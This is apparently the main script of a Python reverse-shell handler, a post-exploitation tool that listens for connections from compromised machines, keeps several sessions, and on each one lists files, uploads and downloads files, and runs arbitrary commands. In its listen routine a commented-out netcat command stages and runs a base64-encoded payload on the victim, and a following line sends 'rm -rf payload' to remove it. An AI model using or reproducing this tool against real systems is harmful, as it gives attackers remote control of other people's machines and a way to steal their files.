#!/usr/bin/python3

from modules.utils import listen, send_file, chk_payload
from modules.sysinfo import SystemInfoGatherer
from modules.nethelper import netshell_loop, pretty
from threading import Thread
import logging
import socket
import time
import sys
import cmd
import os


logging.basicConfig(level=logging.INFO)
sys.dont_write_bytecode = True
PROJ_DIR = os.path.dirname(os.path.realpath(__file__))

class NetShell(cmd.Cmd):
    def __init__(self, server):
        super(NetShell, self).__init__()
        self.prompt = "net_shell > "
        self.server = server
        self.id = None
        self.output = None
        self.is_open = True
        self.is_loop = True
        self.shell_active = True

        Thread(target=self._is_alive).start()

    def precmd(self, line):
        """Hook method executed just before the command line is
        interpreted, but after the input prompt is generated and issued.
        """
        if not self.is_open:
            raise BrokenPipeError
        return line
    
    def postcmd(self, stop, line):
        """Hook method executed just after a command dispatch is finished."""

        return stop

    """
        <--CMD library ends here-->
    """

    def _is_alive(self):
        while self.is_loop:
            try:
                data = self.server.client_socket.recv(16, socket.MSG_DONTWAIT | socket.MSG_PEEK)
                if len(data) == 0:
                    raise OSError
            except BlockingIOError:
                continue
            except OSError as e:
                logging.error(f"Session {self.id +1}: BrokenPipeError")
                self.is_open = False
                self.server.client_socket.close()
                self.server.server_socket.close()
                break
            except Exception:
                logging.error("unexpected exception when checking if a socket is closed")
                break

            time.sleep(1)

    """
        <--Commands start here-->
    """

    def do_ls(self, line):
        if not line:
            path = pretty(self.server.send_command("pwd"))
            ls = pretty(self.server.send_command("ls -la"))
        else:
            if line[0] == "-":
                logging.error("um dont do that. placeholder text.")
                return
            ls = pretty(self.server.send_command(f"ls -la {line}"))
            if "no such file or directory" in ls.lower():
                logging.error("No such file or directory")
                return
            if line == "/":
                path = "root folder"
            else:
                path = pretty(self.server.send_command(f"realpath {line}"))

        sys.stdout.write(f"{path}\n{'=' * (len(path))}\n\n{ls}\n\n")
    
    def do_send(self, line):
        check = self.server.send_command(f"sendingfile/{line}")
        if b"ready" in check:
            with open(line, 'rb') as f:
                while (chunk := f.read(1024)):
                    self.server.client_socket.send(chunk)

    def do_get(self, line):
        contents = pretty(self.server.send_command(f"gettingfile/{line}"))
        if contents:
            with open(line.split("/")[-1], 'w') as f:
                f.write(f"{contents}\n")

    def do_run(self, line):
        self.output = self.server.send_command(line, wt_output=False)
        if self.output:
            sys.stdout.write(f"prettify_output(self.output)\n")

    def do_exit(self, line):
        logging.info(f"Closing connection from session {self.id +1}")

        self.is_loop = False
        self.server.client_socket.close()
        self.server.server_socket.close()
        return True

class LocalShell(cmd.Cmd):
    def __init__(self):
        super(LocalShell, self).__init__()
        self.prompt = "local_shell > "
        self.sessions = []
        self.currentSession = None
        if len(sys.argv) > 1 and sys.argv[1] == "-l":
            self.do_listen(None)
        
        if not os.path.isfile(os.path.join(PROJ_DIR, "payloads/payload")):
            logging.warning('Warning: Binary file "payload" is not present.')
            chk_payload(PROJ_DIR)

        
    def emptyline(self):
        """Called when an empty line is entered in response to the prompt.

        If this method is not overridden, it repeats the last nonempty
        command entered.
        """
        return None

    def postcmd(self, stop, line):
        """Hook method executed just after a command dispatch is finished.
        """

        return stop

    """
        <--Commands start here-->
    """

    def do_listen(self, line):
        if not line:
            host, port = ("localhost", 4242)
        else:
            host, port = line.strip().split(" ")

        sock = listen(host, port, 0)
        sock.sysinfo = SystemInfoGatherer()
        sock.sysinfo.binaryGatherer(sock)

        if not sock:
            return
        
        # TODO: Make it so that if there 
        if sock.sysinfo.is_nc:
            logging.info(f"Sending payload..")
            # sock.client_socket.send(b"touch payload\n")
            # sock.client_socket.send(b"chmod +x payload\n")
            # sock.client_socket.send(f"setsid sh -c '{sock.sysinfo.is_nc} -lnp 1234 | base64 -d > payload && sleep 5 && ./payload {host} {port}'\n".encode())
            sock.server_socket.close()
            sock.client_socket.close()
            # send_file(os.path.join(PROJ_DIR, "payloads/payload"), host, 1234)
            logging.info(f"Payload sent. Starting listener..")
            sock = listen(host, port, 1)
            if not sock:
                return
            sock.client_socket.send(b"rm -rf payload")
        else:
            logging.error("Fail to sent payload. Using shell as client.")

        self.currentSession = NetShell(sock)

        self.sessions.append(self.currentSession)
        self.currentSession.id = (len(self.sessions) - 1)
        logging.info(f"Session {self.currentSession.id + 1} created")
        netshell_loop(self.currentSession)
    
    def do_sessions(self, line):
        args = line.split(" ")
        if args and "-i" in args[0]:
            try:
                index = int(args[1])
            except ValueError:
                logging.error("Index must be int")
                return
            if index:
                if index > len(self.sessions):
                    logging.error("Sesssion not found")
                    return
            netshell_loop(self.sessions[index -1])
            return

        for netShell in self.sessions:
            # TODO: Format this
            sys.stdout.write(f"Session {netShell.id +1} | IP address {netShell.server.client_address[0]} "
                            f"| Port {netShell.server.server_socket.getsockname()[1]} | Open: {netShell.is_open}\n")
        sys.stdout.write("\n")

    def do_exit(self, line):
        logging.info("Exiting...")

        for netShell in self.sessions:
            if netShell.is_open:
                netShell.is_loop = False
                netShell.server.client_socket.close()
                netShell.server.server_socket.close()

        sys.exit()


def _local_loop(localShell):
    try:
        localShell.cmdloop()
    except KeyboardInterrupt:
        print("")
        _local_loop(localShell)

def main():
    _local_loop(LocalShell())


if __name__ == "__main__":
    main()